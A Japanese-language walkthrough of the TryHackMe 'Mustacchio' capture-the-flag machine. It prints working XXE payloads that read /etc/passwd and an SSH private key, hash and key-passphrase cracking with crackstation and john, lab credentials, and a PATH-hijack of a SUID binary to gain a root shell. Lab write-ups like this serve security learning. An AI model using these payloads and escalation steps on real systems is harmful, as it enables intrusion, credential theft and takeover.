# Mustacchio
- Easy boot2root Machine
- https://tryhackme.com/room/mustacchio

# 攻撃シナリオ
1. ポートスキャン
1. 80番のwebサイトにアクセス
1. gobusterでディレクトリ探索
1. ディレクトリリスティングできるパスから不審なファイルを取得
1. 不審なファイルからログイン情報を取得
1. 8765番の管理用webサイトにアクセス
1. ページソースから送信形式のファイルを取得
1. XXEによりsshの秘密鍵入手
1. 秘密鍵のパスワードを取得
1. ssh接続し、フラグ取得
1. suidで実行可能なファイル探索
1. 記載内容から環境変数を変更し、攻撃者が用意したファイルを先に見に行くように設定
1. 権限昇格し、フラグ取得


# ポートスキャン
- 3つのポートが開いている
- 2つwebサイトが稼働している模様
```
─# nmap -sV -sC -T4 -p- thm_target                            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-09 09:58 JST
Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.00% done; ETC: 10:07 (0:07:26 remaining)
Nmap scan report for thm_target (10.10.5.179)
Host is up (0.27s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 535.75 seconds

```
# 80番のwebサイトにアクセス
- 一般ユーザ向けサイトで特になし


# gobusterでディレクトリ探索
- gobusterでディレクトリ探索
```
└─# gobuster dir -u http://thm_target/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://thm_target/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/08/09 10:00:44 Starting gobuster
===============================================================
/images (Status: 301)
/custom (Status: 301)
/fonts (Status: 301)
```
# ディレクトリリスティングできるパスから不審なファイルを取得
```
─# wget http://thm_target/custom/js/users.bak
--2021-08-09 10:07:48--  http://thm_target/custom/js/users.bak
Resolving thm_target (thm_target)... 10.10.5.179
Connecting to thm_target (thm_target)|10.10.5.179|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8192 (8.0K) [application/x-trash]
Saving to: ‘users.bak’

users.bak           100%[================>]   8.00K  --.-KB/s    in 0s      

2021-08-09 10:07:49 (1.03 GB/s) - ‘users.bak’ saved [8192/8192]

```


# 不審なファイルからログイン情報を取得
- sqliteだったので中身を確認するとアカウント＋ハッシュ値が得られた
```
└─# file users.bak                    
users.bak: SQLite 3.x database, last written using SQLite version 3034001
                                                                             
┌──(root💀kali)-[~/mus]
└─# sqlite3 users.bak
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> slelect * from users;
Error: near "slelect": syntax error
sqlite> select * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

```

- crackstationからハッシュ値を取得
    - https://crackstation.net/
```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b	sha1	bulldog19
```


# 8765番の管理用webサイトにアクセス
- http://thm_target:8765/

# ページソースから送信形式のファイルを取得
- 怪しい記述
- Example=/auth/dontforget.bak
- Barry, you can now SSH in using your key!
```
<script type="text/javascript">

      //document.cookie = "Example=/auth/dontforget.bak"; 

      function checktarea() {

      let tbox = document.getElementById("box").value;

      if (tbox == null || tbox.length == 0) {

        alert("Insert XML Code!")

      }

  }

</script>

</head>

<body>

    <!-- Barry, you can now SSH in using your key!-->
```
- XMLのフォーマットが入手できる
```
─# wget http://thm_target:8765/auth/dontforget.bak   
--2021-08-09 10:16:44--  http://thm_target:8765/auth/dontforget.bak
Resolving thm_target (thm_target)... 10.10.5.179
Connecting to thm_target (thm_target)|10.10.5.179|:8765... connected.
HTTP request sent, awaiting response... 200 OK
Length: 996 [application/octet-stream]
Saving to: ‘dontforget.bak’

dontforget.bak   100%[========>]     996  --.-KB/s    in 0s      

2021-08-09 10:16:45 (152 MB/s) - ‘dontforget.bak’ saved [996/996]

                                                                  
┌──(root💀kali)-[~/mus]
└─# file dontforget.bak               
dontforget.bak: XML 1.0 document, UTF-8 Unicode text, with very long lines, with CRLF line terminators
                                                                  
┌──(root💀kali)-[~/mus]
└─# cat dontforget.bak                 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment> 
```

# XXEによりsshの秘密鍵入手
- passwdファイルを取得できるかチェック
```
└─# cat attack.xml                     
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>

```
- response
- /home/barryがユーザでいる
```
Comment :
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false joe:x:1002:1002::/home/joe:/bin/bash barry:x:1003:1003::/home/barry:/bin/bash
```
- 秘密鍵を入手
```
─# cat attack_id_rsa.xml              
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>

```
- response
```
        <h3>Comment Preview:</h3><p>Name: Joe Hamd</p><p>Author : Barry Clad</p><p>Comment :<br> -----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----<p/>    </section>
```

# 秘密鍵のパスワードを取得
- warningが出る場合は一回known_hostを消すとエラー消える

```
┌──(root💀kali)-[~/mus]
└─# vi id_rsa    
                                                                       
┌──(root💀kali)-[~/mus]
└─# chmod 600 id_rsa     
                                                                        
┌──(root💀kali)-[~/mus]
└─# ssh -i id_rsa barry@thm_target                               255 ⨯
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@       WARNING: POSSIBLE DNS SPOOFING DETECTED!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
The ECDSA host key for thm_target has changed,
and the key for the corresponding IP address 10.10.5.179
is unknown. This could either mean that
DNS SPOOFING is happening or the IP address for the host
and its host key have changed at the same time.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:ZZet5QyZ8Pn5+08sVBFZdDzP/6yZEQeNpRZEd5DLLks.
Please contact your system administrator.
Add correct host key in /root/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /root/.ssh/known_hosts:1
  remove with:
  ssh-keygen -f "/root/.ssh/known_hosts" -R "thm_target"
ECDSA host key for thm_target has changed and you have requested strict checking.
Host key verification failed.
                                                                       
┌──(root💀kali)-[~/mus]
└─# rm ~/.ssh/known_hosts                                        255 ⨯
                                                                       
┌──(root💀kali)-[~/mus]
└─# ssh -i id_rsa barry@thm_target
The authenticity of host 'thm_target (10.10.5.179)' can't be established.
ECDSA key fingerprint is SHA256:ZZet5QyZ8Pn5+08sVBFZdDzP/6yZEQeNpRZEd5DLLks.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thm_target,10.10.5.179' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

```
- johnを使ってパスワードを取得
```
┌──(root💀kali)-[~/mus]
└─# locate ssh2john.py                                           130 ⨯
/usr/share/john/ssh2john.py
                                                                       
┌──(root💀kali)-[~/mus]
└─# /usr/share/john/ssh2john.py id_rsa >hash
                                                                       
┌──(root💀kali)-[~/mus]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2021-08-09 10:38) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/sa6_123..*7¡Vamos!
Session completed

```

# ssh接続し、フラグ取得
```
─# ssh -i id_rsa barry@thm_target             
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ 
```

# suidつきのファイル探索
```
barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su

```

```
barry@mustacchio:~$ file /home/joe/live_log 
/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
barry@mustacchio:~$ strings /home/joe/live_log
～～
tail -f /var/log/nginx/access.log
～～
barry@mustacchio:~$ ls -al /home/joe
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12 15:48 .
drwxr-xr-x 4 root root  4096 Jun 12 15:48 ..
-rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_log
```
# 記載内容から環境変数を変更し、攻撃者が用意したファイルを先に見に行くように設定
```
barry@mustacchio:~$ cd /tmp
barry@mustacchio:/tmp$ echo "/bin/bash" > tail
barry@mustacchio:/tmp$ chmod +x tail 
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
```

# 権限昇格し、フラグ取得
```
barry@mustacchio:/tmp$ /home/joe/live_log 
root@mustacchio:/tmp# whoami
root
root@mustacchio:/tmp# cd /root
root@mustacchio:/root# ls
root.txt
root@mustacchio:/root# cat root.txt 
```
